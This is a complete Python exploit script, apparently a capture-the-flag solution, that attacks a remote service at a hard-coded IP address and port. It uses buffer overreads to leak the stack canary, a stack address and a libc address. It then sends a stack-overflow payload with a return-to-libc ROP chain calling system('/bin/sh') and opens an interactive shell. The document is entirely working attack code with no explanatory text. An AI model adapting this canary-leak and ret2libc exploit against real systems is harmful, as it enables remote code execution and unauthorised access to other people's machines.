#!/usr/bin/env python3
from ptrlib import *

io = remote("nc 34.84.255.147 38579")
libc = ELF('./libc.so.6')

io.sendline(b"A" * 0x108+b"B")
leak = io.recvlineafter(b"B")
canary = u64(leak[0:7]) << 8
print("[+] canary: "+hex(canary))
stack_addr = u64(leak[7:])
print("[+] stack: "+hex(stack_addr))

io.sendline(b"A" * 0x137+b"B")
leak = io.recvlineafter(b"B")
libc.base = u64(leak[0:8]) - 0x29d90
print("[+] libc: "+hex(libc.base))

payload = p64(next(libc.gadget("pop rdi; ret;")))
payload += p64(next(libc.search("/bin/sh\x00")))
payload += p64(next(libc.gadget("ret;")))
payload += p64(libc.symbol("system"))

io.recvline()
io.sendline(b"A"*0x108+p64(canary)+p64(stack_addr)+payload)
io.recvline()

io.interactive()
